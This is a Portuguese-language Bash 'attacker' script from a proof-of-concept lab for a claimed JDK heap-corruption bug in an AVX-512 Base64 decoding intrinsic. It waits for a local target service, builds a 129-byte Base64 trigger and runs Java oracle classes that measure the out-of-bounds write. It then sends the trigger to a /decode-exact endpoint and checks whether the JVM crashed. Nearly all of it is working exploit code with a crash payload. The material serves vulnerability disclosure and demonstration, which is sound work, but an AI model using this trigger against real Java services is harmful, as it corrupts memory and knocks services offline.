#!/usr/bin/env bash
# Painel do ATACANTE (terminal 1).
# Envia o gatilho de 129 bytes, mede a janela OOB e derruba o alvo.
#
# Autor do harness: eduxcode (github.com/eduxcode)
# Primitiva: CVE-2026-114938
set -uo pipefail
LAB="$(cd "$(dirname "$0")/.." && pwd)"
cd "$LAB"
source "$LAB/demo/env.sh"

PORT="8080"
BASE="http://127.0.0.1:${PORT}"
JDK="${JDK:-eclipse-temurin:17.0.6_10-jdk}"
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

printf '\033[1;32m'
cat <<'EOF'
+--------------------------------------------------------------+
|  ATACANTE  -  gatilho Base64 de 129 bytes                    |
|  harness: eduxcode (github.com/eduxcode)                     |
|  primitiva: CVE-2026-114938                                  |
+--------------------------------------------------------------+
EOF
printf '\033[0m\n'

echo "aguardando o alvo em $BASE ..."
for _ in $(seq 1 120); do
  curl -sf -m 2 "$BASE/health" >/dev/null 2>&1 && break
  sleep 1
done
if ! curl -sf -m 2 "$BASE/health" >/dev/null 2>&1; then
  echo "alvo indisponivel; suba ./demo/target.sh primeiro"; exit 1
fi
echo "alvo: $(curl -s "$BASE/health")"
echo

echo "-- 1. gate de CPU --------------------------------------------------------"
if [ "$SDE_MODE" = 1 ]; then
  echo "   AVX-512 VBMI: EMULADO via Intel SDE"
  echo "   (o CPUID visto pela JVM reporta avx512f/bw/vbmi; o hardware nao tem)"
else
  FLAGS="$(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n')"
  MISS=""
  for f in avx512f avx512bw avx512vbmi bmi2; do
    grep -qx "$f" <<<"$FLAGS" || MISS="$MISS $f"
  done
  if [ -z "$MISS" ]; then
    echo "   AVX-512 VBMI: presente (nativo)"
  else
    echo "   AVX-512 VBMI: ausente ->$MISS"
    echo "   sem SDE, o intrinsic nao executa; espere 'sem corrupcao'"
  fi
fi
echo

VALID="$(python3 -c 'print("A"*64)')"
TRIG="$(python3 -c 'import sys;sys.stdout.write("A"*128+"=")')"

echo "-- 2. payload ------------------------------------------------------------"
echo "   baseline: 64x'A'          -> ${#VALID} bytes (valido, decodifica 48)"
echo "   gatilho : 128x'A' + '='   -> ${#TRIG} bytes"
echo "   por que 129: o stub AVX-512 exige length > 128; a cauda de 1 byte"
echo "   apos dois blocos de 64 faz output_size = -1 e a mascara virar 0xffff..."
echo

send() { # rotulo payload endpoint
  local label="$1" payload="$2" ep="$3" code body t0 t1 ms
  t0=$(date +%s%N)
  code=$(curl -s -o "$TMP" -w '%{http_code}' -m 30 -X POST --data-binary "$payload" "$BASE/$ep")
  t1=$(date +%s%N)
  ms=$(( (t1 - t0) / 1000000 ))
  body="$(head -c 220 "$TMP")"
  printf '   %-12s %-14s http=%-3s %6dms  %s\n' "$label" "/$ep" "$code" "$ms" "$body"
}

echo "-- 3. baseline -----------------------------------------------------------"
send "baseline" "$VALID" "decode-safe"
echo

echo "-- 4. mecanismo: a mascara da store (roda em qualquer CPU) ---------------"
if [ "$SDE_MODE" = 1 ]; then
  "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" -cp "$J4S_BUILD" MaskUnderflow 2>&1 | sed -n '1,10p'
else
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JDK" \
    sh -c 'javac -d /tmp/o MaskUnderflow.java && java -cp /tmp/o MaskUnderflow' 2>&1 | sed -n '1,10p'
fi
echo

echo "-- 5. oraculo: mede a janela exata da escrita ----------------------------"
if [ "$SDE_MODE" = 1 ]; then
  J4S_SDE=1 "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" \
    -cp "$J4S_BUILD" Oracle --warmup 5000 2>&1
else
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JDK" \
    sh -c 'javac -d /tmp/o Oracle.java && java -cp /tmp/o Oracle --warmup 200000' 2>&1
fi
RC=$?
echo

echo "-- 6. disparo no alvo: /decode-exact (buffer exato + vitima) -------------"
echo "   a JDK rejeita a entrada, mas a store de 64 bytes ja aconteceu"
send "GATILHO" "$TRIG" "decode-exact"
echo

sleep 1
if curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
  echo "   alvo ainda responde: $(curl -s "$BASE/health")"
else
  echo "   ALVO NAO RESPONDE -> a JVM caiu (veja o painel do alvo)"
fi
echo

echo "-- 7. veredito -----------------------------------------------------------"
if [ $RC -eq 0 ]; then
  echo "   CORRUPCAO DE HEAP REPRODUZIDA: 62 bytes alem do buffer de 98."
  echo "   O header do objeto vizinho foi sobrescrito (victim_len != 256)."
  echo "   Impacto demonstrado: corrupcao de memoria + queda da JVM."
  echo "   RCE exige uma cadeia por aplicacao e nao e publica."
else
  echo "   sem corrupcao neste host (rc=$RC)."
  echo "   use ./demo/setup-sde.sh para emular AVX-512 localmente."
fi
